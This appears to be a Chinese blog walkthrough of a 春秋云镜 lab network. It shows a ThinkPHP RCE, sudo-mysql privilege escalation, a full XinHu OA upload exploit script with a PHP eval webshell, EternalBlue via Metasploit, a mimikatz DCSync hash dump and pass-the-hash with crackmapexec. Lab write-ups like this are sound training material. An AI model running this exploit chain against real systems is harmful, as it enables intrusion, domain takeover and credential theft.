---
title: "Initial"
description: ""
slug: "Initial"
date: "2025-03-05 15:30:51+08:00"
image: "assets/Pasted image 20250305153105.png"
categories: 
  - 春秋云镜
  - 靶机
tags: 
  - thinkphp
  - msf
  - pth
draft: false
---

## 信息搜集&getshell
![](<assets/Pasted image 20250305153105.png>)
登录功能是坏的，可以看到注释掉的前端代码，尝试发包注册用户但是404
![](<assets/Pasted image 20250305155419.png>)
![](<assets/Pasted image 20250305155427.png>)
![](<assets/Pasted image 20250305155441.png>)
扫目录找到泄露代码，但是根本没有用，没有敏感信息，没有关键源码，也没有利用点？？
查了下才想起来是thinkphp的icon，这下真是纯小丑了🤡。
![](<assets/Pasted image 20250305161059.png>)
直接打
![](<assets/Pasted image 20250305161509.png>)
## 提权&flag01
查看bash历史命令可以看到根目录有个flag，应该要提权
```shell
www-data@ubuntu-web01:/$ sudo mysql -e '\! /bin/sh'
sudo mysql -e '\! /bin/sh'
whoami
root
cat /root/flag*
cat: /root/flag: Is a directory
ls /root -la
total 48
drwx------  6 root root 4096 Jun  5  2022 .
drwxr-xr-x 18 root root 4096 Mar  5 15:13 ..
-rw-------  1 root root 1669 Jun  5  2022 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  3 root root 4096 Apr 28  2022 .cache
-rw-------  1 root root   18 Jun  5  2022 .mysql_history
drwxr-xr-x  2 root root 4096 Apr 28  2022 .pip
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root  206 Mar  5 15:13 .pydistutils.cfg
drwx------  2 root root 4096 Apr 28  2022 .ssh
-rw-------  1 root root 2988 Jun  5  2022 .viminfo
drwxr-xr-x  2 root root 4096 Jun  5  2022 flag
ls /root/flag -la
total 12
drwxr-xr-x 2 root root 4096 Jun  5  2022 .
drwx------ 6 root root 4096 Jun  5  2022 ..
-r-------- 1 root root 1588 Jun  5  2022 flag01.txt
cat /root/flag/flag*
 ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ 
░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
 ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ 
  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         
   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████
  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██
 ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ 
░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  

Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.

flag01: flag{60b53231-
```
sudo -l可以看到能以root权限执行mysql，提权后拿到第一个flag。提示下一个flag在内网
## 代理&横向
```bash
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe31:4531  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:31:45:31  txqueuelen 1000  (Ethernet)
        RX packets 373582  bytes 191434364 (191.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 261574  bytes 36256909 (36.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4160  bytes 385611 (385.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4160  bytes 385611 (385.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

fscan -h 172.22.1.0/24
/bin/sh: 4: fscan: not found
./fscan -h  172.22.1.0/24
/bin/sh: 5: ./fscan: Permission denied
chmod +x fscan
./fscan -h 172.22.1.0/24
[2025-03-05 16:34:56] [INFO] 开始主机扫描
[2025-03-05 16:34:56] [SUCCESS] 目标 172.22.1.15     存活 (ICMP)
[2025-03-05 16:34:56] [SUCCESS] 目标 172.22.1.2      存活 (ICMP)
[2025-03-05 16:34:56] [SUCCESS] 目标 172.22.1.18     存活 (ICMP)
[2025-03-05 16:34:56] [SUCCESS] 目标 172.22.1.21     存活 (ICMP)
[2025-03-05 16:34:59] [INFO] 存活主机数量: 4
[2025-03-05 16:34:59] [INFO] 有效端口数量: 233
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.15:80
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.15:22
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.2:88
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.18:80
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.18:139
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.2:139
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.21:135
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.18:135
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.2:135
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.21:139
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.21:445
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.18:445
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.2:445
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.2:389
[2025-03-05 16:34:59] [SUCCESS] 端口开放 172.22.1.18:3306
[2025-03-05 16:34:59] [SUCCESS] 服务识别 172.22.1.15:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
[2025-03-05 16:35:04] [SUCCESS] 服务识别 172.22.1.18:3306 => [mysql] 产品:MySQL 信息:unauthorized Banner:[D.j Host '172.22.1.15' is not allowed to connect to this MySQL server]
[2025-03-05 16:35:04] [SUCCESS] 服务识别 172.22.1.2:88 => 
[2025-03-05 16:35:04] [SUCCESS] 服务识别 172.22.1.18:139 =>  Banner:[.]
[2025-03-05 16:35:04] [SUCCESS] 服务识别 172.22.1.2:139 =>  Banner:[.]
[2025-03-05 16:35:05] [SUCCESS] 服务识别 172.22.1.15:80 => [http]
[2025-03-05 16:35:05] [SUCCESS] 服务识别 172.22.1.21:139 =>  Banner:[.]
[2025-03-05 16:35:05] [SUCCESS] 服务识别 172.22.1.21:445 => 
[2025-03-05 16:35:05] [SUCCESS] 服务识别 172.22.1.18:445 => 
[2025-03-05 16:35:05] [SUCCESS] 服务识别 172.22.1.2:445 => 
[2025-03-05 16:35:05] [SUCCESS] 服务识别 172.22.1.18:80 => [http]
[2025-03-05 16:35:05] [SUCCESS] 服务识别 172.22.1.2:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
[2025-03-05 16:36:05] [SUCCESS] 服务识别 172.22.1.21:135 => 
[2025-03-05 16:36:05] [SUCCESS] 服务识别 172.22.1.18:135 => 
[2025-03-05 16:36:05] [SUCCESS] 服务识别 172.22.1.2:135 => 
[2025-03-05 16:36:05] [INFO] 存活端口数量: 15
[2025-03-05 16:36:05] [INFO] 开始漏洞扫描
[2025-03-05 16:36:05] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle
[2025-03-05 16:36:05] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.1.2
主机名: DC01
发现的网络接口:
   IPv4地址:
      └─ 172.22.1.2
[2025-03-05 16:36:05] [SUCCESS] 网站标题 http://172.22.1.15        状态码:200 长度:5578   标题:Bootstrap Material Admin
[2025-03-05 16:36:05] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.1.18
主机名: XIAORANG-OA01
发现的网络接口:
   IPv4地址:
      └─ 172.22.1.18
[2025-03-05 16:36:05] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.1.21
主机名: XIAORANG-WIN7
发现的网络接口:
   IPv4地址:
      └─ 172.22.1.21
[2025-03-05 16:36:05] [SUCCESS] 网站标题 http://172.22.1.18        状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.1.18?m=login
[2025-03-05 16:36:05] [SUCCESS] NetBios 172.22.1.2      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
[2025-03-05 16:36:05] [SUCCESS] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600
[2025-03-05 16:36:05] [INFO] 系统信息 172.22.1.2 [Windows Server 2016 Datacenter 14393]
[2025-03-05 16:36:05] [SUCCESS] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[2025-03-05 16:36:05] [SUCCESS] 发现漏洞 172.22.1.21 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010
[2025-03-05 16:36:05] [SUCCESS] 网站标题 http://172.22.1.18?m=login 状态码:200 长度:4012   标题:信呼协同办公系统
[2025-03-05 16:36:06] [SUCCESS] 目标: http://172.22.1.15:80
  漏洞类型: poc-yaml-thinkphp5023-method-rce
  漏洞名称: poc1
  详细信息:
        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
```
直接传一个fscan开扫
目前已有的信息：
172.22.1.15:跳板机
172.22.1.2:DC域控  
172.22.1.21:Windows的机器并且存在MS17-010 漏洞  
172.22.1.18:信呼OA办公系统
### 信呼oa
版本为v2.2.8，直接打nday
```python
import requests
session = requests.session()
url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}
r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('5.php', 'br+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir")
print(r.text)
print(filepath)
```
```bash
┌──(㉿kali)-[~/Desktop]
└─$ proxychains python oa.py
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  :1080  ...  172.22.1.18:80  ...  OK
<br />
<b>Notice</b>:  Undefined offset: 1 in <b>C:\phpStudy\PHPTutorial\WWW\upload\2025-04\10_11472758.php</b> on line <b>1</b><br />

/upload/2025-04/10_11472758.php
                                                                                                        
┌──(㉿kali)-[~/Desktop]
└─$ cat 5.php
<?=eval($_POST[1]);?>
```
![](<assets/Pasted image 20250410115343.png>)
flag02: 2ce3-4813-87d4-
### DC
```text
proxychains4 msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set RHOSTS 172.22.1.21
exploit
```
```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514
1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512
1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512
1000    DC01$   2352f558cd0ab4dee27b03ff787b3243        532480
500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512
1104    XIAORANG-OA01$  c0ee2a4e9a29ac4460e63805465322b7        4096
1108    XIAORANG-WIN7$  5b6f748416083631130f0a2f49db6e4b        4096
```
抓取administrator的hash
用crackmapexec哈希传递，执行命令读取
```bash
┌──(㉿kali)-[~/Desktop]
└─$ proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type C:\Users\Administrator\flag\flag03.txt"
/usr/lib/python3/dist-packages/cme/cli.py:35: SyntaxWarning: invalid escape sequence '\ '
  """,
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\p'
  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\{'
  command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & %COMSPEC% /Q /c del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
[proxychains] Strict chain  ...  :1080  ...  172.22.1.2:445  ...  OK
[proxychains] Strict chain  ...  :1080  ...  172.22.1.2:135  ...  OK
SMB         172.22.1.2      445    DC01             [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True)
[proxychains] Strict chain  ...  :1080  ...  172.22.1.2:445  ...  OK
SMB         172.22.1.2      445    DC01             [+] xiaorang.lab\administrator:10cf89a850fb1cdbe6bb432b859164c8 (Pwn3d!)
[proxychains] Strict chain  ...  :1080  ...  172.22.1.2:135  ...  OK
[proxychains] Strict chain  ...  :1080  ...  172.22.1.2:49668  ...  OK
SMB         172.22.1.2      445    DC01             [+] Executed command 
SMB         172.22.1.2      445    DC01             ___   ___
SMB         172.22.1.2      445    DC01             \\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) )                                                                             
SMB         172.22.1.2      445    DC01             \  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //                                                                                     
SMB         172.22.1.2      445    DC01             / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____                                                                                
SMB         172.22.1.2      445    DC01             / /\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /                                                                               
SMB         172.22.1.2      445    DC01             / /  \\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /                                                                               
SMB         172.22.1.2      445    DC01             
SMB         172.22.1.2      445    DC01             
SMB         172.22.1.2      445    DC01             flag03: e8f88d0d43d6}
SMB         172.22.1.2      445    DC01             
SMB         172.22.1.2      445    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.
```
其他利用方式可以参考
> http://www.s1mh0.cn/blog/index.php/2024/11/12/cqyj_initial/